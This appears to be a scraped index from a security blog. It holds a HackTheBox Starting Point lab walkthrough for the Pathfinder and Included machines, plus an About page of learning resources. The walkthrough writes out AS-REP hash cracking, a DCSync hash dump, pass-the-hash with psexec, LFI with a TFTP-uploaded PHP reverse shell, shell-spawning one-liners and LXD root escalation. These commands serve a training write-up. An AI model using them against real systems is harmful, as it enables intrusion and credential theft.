$krb5asrep$23$svc_bes@MEGACORP.LOCAL:0969b177c87205436a4ef15e3227c3af$f967e09d463ebcfa60a01c5ddb3606de78b62d8629e8de55578236534abf7a8442f3b07dfe0b8fa622dceabb66586c99dec8a3e4629a099fb01acc5721e0ca5ebf59fa0f6841f456a7a855ded8fb2b5860066cca671c8ea362c335c5a1a0bde1a9091b629535fec165388e46b3069c002dd45569a89f6d30f9139911968364ae84bf06de3d39cdcbb3a44b373f71c3ff3f030f3896fa4f698693889e8677136e942d9ba1e3175dc70e67f1b998d52170f3347dcc766fda831f9cd5d1f7d94706f3b423a9bf75869a6772280f69d2f2855a3b855ee221f053478f7e54c98c7fde493f85ce3cec16e47f0c20ced4a65b14 Once obtained the TGT ticket for the svc_bes, let’s save it into a file called hash(it could be any name). We could have also used: GetNPUsers.py megacorp.local/svc\\_bes -request -no-pass -dc-ip 10.10.10.30 | grep krb \u003e hash We will use JTR in conjunction with rockyou.txt to obtain the plaintext password (but we could have also used Hashcat) ``` shell kali@kali:~/HTB/StartingPoint/Pathfinder$ john hash -wordlist=/usr/share/wordlists/rockyou.txt ``` Below the password for svc_bes : Sheffield19 It is now possible to access the server as svc_bes using **WinRM ** (With the nmap scan we noted that WinRM was enabled on port 5985) Let’s install “evil-winrm” (Installation directly as ruby gem) kali@kali:~/HTB/StartingPoint/Pathfinder$ sudo gem install evil-winrm And run it against 10.10.10.30 using “svc_bes” credentials kali@kali:~/HTB/StartingPoint/Pathfinder$ sudo evil-winrm -i 10.10.10.30 -u svc\\_bes -p Sheffield19 ","date":"14 Dec 2020","objectID":"/startingpoint/:6:2","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"◦ Privilege Escalation In order to leverage the GetChangesAll permission, we can use secretsdump.py (link) from Impacket to perform a DCSync attack and dump the NTLM hashes of all domain users. kali@kali:~/HTB/StartingPoint/Pathfinder$ sudo secretsdump.py -dc-ip 10.10.10.30 MEGACORP.LOCAL/svc\\_bes:Sheffield19@10.10.10.30 We can see the default domain Administrator NTLM hash We can use this in a PTH attack (Pass-the-Hash attack) to gain elevated access to the system. For this, we can use Impacket’s psexec.py as follow: psexec.py megacorp.local/administrator@10.10.10.30 -hashes \u003cNTML hash\u003e:\u003cNTLM hash\u003e For \u003cNTML hash\u003e:\u003cNTLM hash\u003e we will use: NTML hash –\u003e aad3b435b51404eeaad3b435b51404ee NTLM hash –\u003e 8a4b77d52b1845bfe949ed1b9643bb18 psexec.py megacorp.local/administrator@10.10.10.30 -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18 An as we can see we gain elevated access to the system ","date":"14 Dec 2020","objectID":"/startingpoint/:6:3","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"▸ INCLUDED (Linux) Machine : Included (Linux) Ip: 10.10.10.55 ","date":"14 Dec 2020","objectID":"/startingpoint/:7:0","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"◦ Enumeration Let’s run nmap with option –A (to enable: OS detection, version detection, script scanning, and traceroute) kali@kali: ~ $ sudo nmap -A -v 10.10.10.55 …. PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.29 (Ubuntu) | http-title: Site doesn't have a title (text/html; charset=UTF-8). |_Requested resource was http://10.10.10.55/?file=index.php |_https-redirect: ERROR: Script execution failed (use -d to debug) From a TCP scan we found only port 80 (Apache httpd 2.4.29 ((Ubuntu))) We can navigate to the website in a browser. Let’s try scanning the UDP ports kali@kali: ~ $ sudo nmap -sU -v 10.10.10.55 [sudo] password for kali: ... Not shown: 999 closed ports PORT STATE SERVICE 69/udp open filtered tftp The UDP scan found port 69 to be open, which hosts the TFTP service. TFTP or “Trivial File Transfer Protocol”, is similar to FTP but much simpler. It provides functionality only for uploading or downloading files from a server. Let’s see if we can connect to TFTP and upload a file. We first create a file named “test.txt” We connect and confirm that we can upload files. ","date":"14 Dec 2020","objectID":"/startingpoint/:7:1","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"◦ LFI(Local File Inclusion) Let’s check if the URL of the website “http://10.10.10.55/?file=index.php\" is vulnerable to Local File Inclusion. We can test by changing the URL to the following: http://10.10.10.55/?file=../../../../etc/passwd This is successful, and passwd contents are returned by the server. ","date":"14 Dec 2020","objectID":"/startingpoint/:7:2","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"◦ Foothold We can try upload and execute a “PHP reverse shell ” by combining the LFI vulnerability with the TFTP service. This happens due to the inclusion of the PHP code by the vulnerable page, which results in it’s execution. First we have to modify the PHP reverse shell which cane be taken from here if not present on our kali system. Let’s copy the file into our folder with name “rev.php” As usual, let’s modify the code for our needs: Once changed the IP address and the port, we upload our PHP reverse shell . Let’s start a netcat listener before navigating to the shell . Next, we can use the LFI to access the reverse shell . The default TFTP root folder is /var/lib/tftpboot. Navigating to http://10.10.10.55/?file=../../../../var/lib/tftpboot/rev.php, due to the inclusion of the PHP code by the vulnerable page, will results in the PHP reverse shell execution. We could have also used the “curl” tool as follow: kali@kali:~/HTB/StartingPoint/Included$ curl http://10.10.10.55/?file=../../../../var/lib/tftpboot/rev.php And we get the reverse shell : The low privilged www-data user isn’t allowed to read user files, let’s update the shell as www-data SHELL=/bin/bash script -q /dev/null Ctrl-Z stty raw -echo fg reset xterm Below some other ways to spwan a TTY shell . The top 3 would be most successful in general for spawning from the command line. python3 -c ‘import pty; pty.spawn(\"/bin/sh\")' echo os.system('/bin/shell ‘) /bin/sh -i perl —e ‘exec “/bin/sh”;' perl: exec “/bin/sh”; ruby: exec “/bin/sh” lua: os.execute('/bin/sh’) (From within IRB) exec “/bin/sh” (From within vi) :!shell (From within vi) :set shell =/bin/shell :shell (From within nmap) !sh Many of these will also allow you to escape jail shells (link) From the etc/passwd file we see that we can see there is a user “mike” We can switch to the user mike using the su command (link) with the password founded on the previous machine (Pathfinder). As shown below, once updated the shell as www-data, we can logged (using the su command) in as mike. At location /home/mike we can find the user.txt file We also notice that mike is a lxd member The LXD group is a high-privileged linux group; a member of the local “lxd” group can instantly escalate the privileges to root on the host operating system. ▹ Container and virtualization tools(link) While VMs supply a complete environment, system containers offer an environment as close as possible to the one you’d get from a VM, but without the overhead that comes with running a separate kernel and simulating all the hardware. ","date":"14 Dec 2020","objectID":"/startingpoint/:7:3","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"▹ LXD ◦ Introduction to LXD and LXC (link) Introduction to LXD and LXC (link) The vulnerability exists even with the LXD snap package , this is irrespective of whether that user has been granted sudo rights and does not require them to enter their password. LXD is a root process that carries out actions for anyone with write access to the LXD UNIX socket. It often does not attempt to match the privileges of the calling user. There are multiple methods to exploit this. One of them is to use the LXD API to mount the host’s root filesystem into a container which is going to use in this post. This gives a low-privilege user root access to the host filesystem. • Linux Container (LXC) are often considered as a lightweight virtualization technology that is something in the middle between a chroot and a completely developed virtual machine, which creates an environment as close as possible to a Linux installation but without the need for a separate kernel. • Linux daemon (LXD) is the lightervisor, or lightweight container hypervisor. LXD is building on top of a container technology called LXC which was used by Docker before. It uses the stable LXC API to do all the container management behind the scene, adding the REST API on top and providing a much simpler, more consistent user experience. ","date":"14 Dec 2020","objectID":"/startingpoint/:7:4","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"◦ LXD Privilege Escalation Privilege escalation through lxd requires the access of local account. Note: the most important condition is that the user should be a memberof lxd group (in our case is 108, but it could have been any othernumber) First, we have create an image for lxd, thus we first need to clone on our local machine the following build-alpine repository git clone https://github.com/saghul/lxd-alpine-builder.git We move into the lxd-alpine-builder And execute the “./build-alpine” file On running the above command, a “tar.gz” file is created. Now we have to transferred this “tar.gz” file from the attacker machine to the host (victim) machine. We can use the following python command to start a local webserver python -m SimpleHTTPServer 8888 On the host(victim) machine we can download the file “tar.gz” using the command “wget” as follow: First we move into the /tmp folder Then we run the command mike@included:/$ cd /tmp mike@included:/tmp$ wget 10.10.14.3:8888/alpine-v3.10-x86_64-20191008_1227.tar.gz We will see that our file has been transferred/downloaded. Next, we run the following commands to get the root. First we built the image and can be added as an image to LXD as follows: mike@included:/tmp$ lxc image import ./alpine-v3.12-x86_64-20200728_1438.tar.gz --alias \u003caliasName\u003e mike@included:/tmp$ lxc image import ./alpine-v3.12-x86_64-20200728_1438.tar.gz --alias rootimage In the above command we used “rootimage” as ALIAS but it could ahve been any name We can use the list command to check the list of images mike@included:/$ The command above will let us have access to the entire filesystem from within the container. mike@included:/tmp$ lxc init \u003caliasName\u003e ignite -c security.privileged=true mike@included:/tmp$ lxc init rootimage ignite -c security.privileged=true mike@included:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true The next set of commands start the container and drop us into a shell (as root) on it. mike@included:/tmp$ lxc start ignite mike@included:/tmp$ lxc exec ignite /bin/sh We can now navigate to /mnt/root/root/ and read root.txt along with login.sql, which reveals credentials. The login.sql file reveals some credentials ","date":"14 Dec 2020","objectID":"/startingpoint/:7:5","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":null,"content":"This blog is just an attempt to understand a various concepts in reverse engineering, penetration testing, malware analysis, programming and security Below some useful links: Hasherezade (https://github.com/hasherezade) (https://hasherezade.github.io/) OALabs - Malware analysis tools, techniques, and tutorials! (https://www.youtube.com/c/OALabs) Hexorcist Reverse Engineering Tutorials by Nicolas Brulez (https://www.youtube.com/c/HEXORCIST) Corelan Cybersecurity Research by Peter Van Eeckhoutte (https://www.corelan.be/) Malware Unicorn RE101 \u0026 RE102 (https://malwareunicorn.org/workshops/re101.html#0) Malware Research Academy (https://www.youtube.com/c/MalwareResearchAcademy/videos) CS6038/CS5138 Malware Analysis(https://class.malware.re/) CS 61: Systems Programming and Machine Organization 2021(https://cs61.seas.harvard.edu/site/2021/) pwn college (https://pwn.college/) Hackthebox (https://www.hackthebox.com/) OpenSecurityTraining1 by Xeno Kovah (https://opensecuritytraining.info) OpenSecurityTraining2 by Xeno Kovah (https://ost2.fyi/) Alexandre Borges Malware Analysis Series (MAS) (https://exploitreversing.com/) Offensive Software Exploitation (OSE) (https://exploitation.ashemery.com/) Nightmare: Intro to binary exploitation (https://guyinatuxedo.github.io/index.html) Max Kersten: Binary Analysis Course (https://maxkersten.nl/binary-analysis-course/) Practical Binary Analysis by Andriesse (https://practicalbinaryanalysis.com/) Advanced Binary Deobfuscation(https://github.com/malrev/ABD) GitHub Security Lab Fuzzing 101(https://github.com/antonio-morales/Fuzzing101) Anti-Debug Tricks by Check Point Research (https://anti-debug.checkpoint.com/) ASSEMBLER WHEREVER WE - IDAPRO (https://www.youtube.com/channel/UCFCgOt2YjtA-gnbkeQehR5w/videos) Dr Josh Stroschein (https://www.youtube.com/c/DrJoshStroschein/) (https://0xevilc0de.com/) ","date":"02 Aug 2019","objectID":"/about/:0:0","tags":null,"title":"About","uri":"/about/"}]